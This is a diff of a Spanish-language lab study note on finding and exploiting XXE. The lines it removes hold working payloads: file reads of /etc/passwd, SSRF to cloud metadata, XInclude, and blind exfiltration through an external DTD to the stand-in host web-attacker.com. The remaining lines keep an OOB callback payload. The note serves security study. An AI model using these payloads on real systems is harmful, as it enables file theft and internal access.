@@ -12,7 +12,8 @@ tags:
 # XXE — Punto de entrada
 
 > Documento **agnóstico al negocio**: *cómo **detectar y explotar** XXE*.
-> **Fundamentos** (qué es XML/DTD/entidades, y los payloads encadenados a fondo) → [[how-to-work/xml|Cómo funciona XML, DTD y entidades]].
+> **Fundamentos** (qué es XML/DTD/entidades) → [[how-to-work/xml|Cómo funciona XML, DTD y entidades]].
+> **PoCs completas por vector** → carpeta [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|examples/ (001–008)]].
 > **Dónde** aplica (qué endpoint come XML) → eso vive en los `STAGE_x`.
 
 > [!abstract] La idea en una línea
@@ -22,7 +23,7 @@ tags:
 
 - 🧠 **Fundamentos** (qué es XML, entities, DTD internal/external, entidades general `&` vs de parámetro `%`) → [[how-to-work/xml|how-to-work/xml]]
 - 🧪 **Laboratorios** — 9 labs (2 Apprentice + 6 Practitioner + 1 Expert), payload por lab → [[vulnerabilities/006-xxe/labs/README|labs/README]]
-- 🐍 **Ejemplos / PoCs completas** (vector entero: request + `Content-Type` + DTD + verificación):
+- 🐍 **Ejemplos / PoCs completas** (vector entero: request + `Content-Type` + DTD + verificación), del más simple al más rebuscado:
     - [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001 · leer archivo in-band]] · [[vulnerabilities/006-xxe/examples/002-xxe-a-ssrf-metadata-cloud|002 · XXE → SSRF]] · [[vulnerabilities/006-xxe/examples/003-xinclude-sin-controlar-el-xml|003 · XInclude]] · [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg|004 · subida de SVG]]
     - Ciego: [[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob|005 · callback OOB]] · [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006 · exfiltrar con DTD externo ⭐]] · [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007 · error-based]] · [[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008 · reutilizar DTD local]]
 - 🛠️ **Scripts** (generadores de payloads en Python) → [[vulnerabilities/006-xxe/scripts/README|scripts/]] (`gen_svg_xxe.py` arma el SVG con el recurso parametrizable)
@@ -46,139 +47,46 @@ tags:
    - ¿Vuelve el contenido? → **XXE in-band** ✅.
 3. **¿No refleja nada? → blind.** Probá interacción OOB (Collaborator):
    ```xml
-   <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://COLLAB"> ]>
+   <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe; ]>
    ```
-   - Si el parser **bloquea entidades generales externas**, pasá a **entidad de parámetro**: `<!ENTITY % xxe SYSTEM "http://COLLAB"> %xxe;`.
-4. **Elegí cómo exfiltrar** según lo que tengas (ver árbol abajo).
+   - Si con entidad **general** (`&xxe;`) no dispara, es porque el parser bloquea entidades generales externas → usá la de **parámetro** (`%`), como arriba.
+4. **Elegí el vector** según lo que tengas (tabla + flujo abajo) y andá al ejemplo correspondiente.
 
 > [!note] ¿Requiere enviar exploit?
 > **No** en la mayoría: XXE se dispara en la **misma request** que mandás vos (Repeater). Solo necesitás infra externa (**exploit server** para la DTD, **Collaborator** para OOB) cuando es **blind**. No hace falta víctima/admin como en CORS/CSRF/XSS.
 
 ---
 
-## 🧩 Árbol de decisión (según lo que puedas hacer)
+## 🧩 Árbol de decisión (cada fila → su ejemplo)
 
-| Situación | Técnica | Payload |
+| Situación | Técnica | Ejemplo |
 | --- | --- | --- |
-| Controlás el XML **y la respuesta refleja** | **In-band file read** | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` + `&xxe;` |
-| Querés pegarle a algo interno | **XXE → SSRF** | `<!ENTITY xxe SYSTEM "http://169.254.169.254/…">` |
-| **No** controlás el documento entero (solo un valor) | **XInclude** | `<xi:include>` (ver abajo) |
-| El input es una **imagen/archivo** | **XXE en SVG/Office** | SVG con `<!DOCTYPE>` → [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg|004]] (generalo con [[vulnerabilities/006-xxe/scripts/README\|gen_svg_xxe.py]]) |
-| Blind, solo confirmar | **OOB** con Collaborator | `SYSTEM "http://COLLAB"` (general → si filtran, `%` de parámetro) |
-| Blind, querés el **contenido** | **DTD externa** (exfil) | → [[#Blind — exfiltrar contenido con DTD externa (OOB)\|exfil OOB]] |
-| Blind, hay **errores verbosos** | **Error-based** | → [[#Blind — forzar error para leer el archivo (error-based)\|error-based]] |
-| Blind, **sin salida a internet** | **Reutilizar DTD local** | → [[#Blind — reutilizar un DTD local (sin salida a internet)\|local DTD]] |
+| Controlás el XML **y la respuesta refleja** un archivo | **In-band file read** | [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band\|001 · in-band]] |
+| Querés pegarle a algo **interno** | **XXE → SSRF** | [[vulnerabilities/006-xxe/examples/002-xxe-a-ssrf-metadata-cloud\|002 · SSRF]] |
+| **No** controlás el documento (solo un valor) | **XInclude** | [[vulnerabilities/006-xxe/examples/003-xinclude-sin-controlar-el-xml\|003 · XInclude]] |
+| El input es una **imagen / archivo** | **XXE en SVG/Office** | [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg\|004 · SVG]] |
+| Blind, **solo confirmar** | **OOB** (Collaborator) | [[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob\|005 · OOB]] |
+| Blind, querés el **contenido** | **DTD externa** (exfil) | [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo\|006 · exfil ⭐]] |
+| Blind, hay **errores verbosos** | **Error-based** | [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo\|007 · error-based]] |
+| Blind, **sin salida a internet** | **Reutilizar DTD local** | [[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local\|008 · DTD local]] |
 
-### In-band: leer archivo
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
-```
+## 🗺️ Qué probar primero (flujo)
 
-### XXE → SSRF (metadata cloud)
-```xml
-<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/…"> ]>
-<!-- &xxe; en el valor reflejado -->
-```
-
-### XInclude (cuando NO controlás el `<!DOCTYPE>`)
-Cuando tu input es solo **un valor** que el server mete en un XML propio, no podés poner un DOCTYPE. Inyectás un `XInclude` en ese valor:
-```xml
-<foo xmlns:xi="http://www.w3.org/2001/XInclude">
-  <xi:include parse="text" href="file:///etc/passwd"/>
-</foo>
-```
-
----
-
-## 🪜 Escalera del XXE ciego (blind)
-
-Cuando la respuesta **no refleja** nada, escalás con **entidades de parámetro** (`%`). De más simple a más retorcido. Reemplazá `web-attacker.com` por tu **exploit server / Collaborator**.
-
-> Recordá el concepto de entidades general vs. de parámetro → [[how-to-work/xml#3. Tipos de entidad|how-to-work/xml]].
-
-### Cargar un DTD externo
-Las técnicas de abajo (`%eval`, etc.) **no** se pueden declarar en una DTD interna (restricción de XML sobre entidades de parámetro en el subset interno). Solución: hospedar el DTD en tu server y **cargarlo** desde la request:
-```xml
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
-```
-`malicious.dtd` contiene el bloque de exfil o de error de abajo.
-
-### Blind — exfiltrar contenido con DTD externa (OOB)
-Una entidad lee el archivo (`%file`), otra construye dinámicamente la que lo **manda por la URL** de tu server (`%exfiltrate`). Va en tu `malicious.dtd`:
-```dtd
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
-%eval;
-%exfiltrate;
-```
-> `&#x25;` es `%` escapado (necesario para declarar una entidad **dentro** de otra).
-> **Variante FTP:** si un firewall bloquea la salida HTTP, cambiá `http://` por `ftp://web-attacker.com/…`. FTP suele estar menos filtrado y tolera contenidos con caracteres que romperían una URL HTTP (saltos de línea, etc.).
-
-### Blind — forzar error para leer el archivo (error-based)
-Sin salida OOB pero con **errores verbosos**: hacés que el parser intente abrir una ruta **inexistente** cuyo nombre **contiene el archivo** → el error filtra el contenido:
-```dtd
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
-%eval;
-%error;
-```
-El parser intenta abrir `file:///nonexistent/root:x:0:0:...` → *No such file* → **el error trae el contenido de `/etc/passwd`**.
-
-### Blind — reutilizar un DTD local (sin salida a internet)
-Peor caso: la petición **no devuelve** el resultado **y** no hay salida OAST (ni OOB ni DTD externa porque no hay internet). Cargás un **DTD que ya existe en el disco** del server y **redefinís una de sus entidades** para inyectar el ataque error-based — todo local:
-```xml
-<!DOCTYPE foo [
-<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
-<!ENTITY % custom_entity '
-<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
-&#x25;eval;
-&#x25;error;
-'>
-%local_dtd;
-]>
-```
-`custom_entity` **tiene que ser el nombre de una entidad que exista dentro de `schema.dtd`**: al cargar el DTD local, tu redefinición se dispara y ejecuta el ataque error-based.
+Del más simple al más rebuscado — cada rama termina en el ejemplo a abrir:
 
 ```mermaid
-sequenceDiagram
-    autonumber
-    participant A as Atacante
-    participant P as XML Parser
-    participant F as Filesystem
-    participant App as Aplicación
-
-    A->>P: XML con DTD interna
-    P->>F: Leer schema.dtd local
-    F-->>P: Contenido de schema.dtd
-
-    rect rgb(60, 60, 70)
-        Note over P: custom_entity existe en schema.dtd<br/>La DTD interna la redefine
-    end
-
-    P->>F: Leer /etc/passwd
-    F-->>P: Contenido del archivo
-    P->>F: Abrir file:///nonexistent/&lt;contenido&gt;
-    F-->>P: File not found
-
-    rect rgb(70, 60, 60)
-        P-->>A: XML parsing error CON el contenido de /etc/passwd
-    end
-
-    P --x App: La aplicación nunca procesa el XML (el parseo falló)
+flowchart TD
+    S([Algo parsea XML]) --> A{¿Controlás<br/>el XML entero?}
+    A -->|Es un upload de imagen| E4[004 · SVG]
+    A -->|No, solo un valor / API REST| E3[003 · XInclude]
+    A -->|Sí| B{¿La respuesta refleja?}
+    B -->|Sí · quiero un archivo| E1[001 · in-band file read]
+    B -->|Sí · quiero algo interno| E2[002 · XXE a SSRF]
+    B -->|No = ciego| E5[005 · confirmar OOB]
+    E5 --> E6[006 · exfiltrar con DTD externo]
+    E6 -->|el contenido rompe la URL / sin OOB| E7[007 · error-based]
+    E6 -->|server sin salida a internet| E8[008 · reutilizar DTD local]
 ```
-
-### Buscar DTD locales
-Para el ataque anterior necesitás **conocer un DTD local** y una entidad suya. El más usado es el de GNOME **`yelp`**, presente en muchas imágenes Linux. Primero **confirmás que existe** cargándolo solo:
-```xml
-<!DOCTYPE foo [
-<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-%local_dtd;
-]>
-```
-Si **no** da error, el archivo existe → después redefinís una de **sus** entidades (en `docbookx.dtd` se usa `ISOamso`) con el bloque del ejemplo anterior.
 
 ---
 
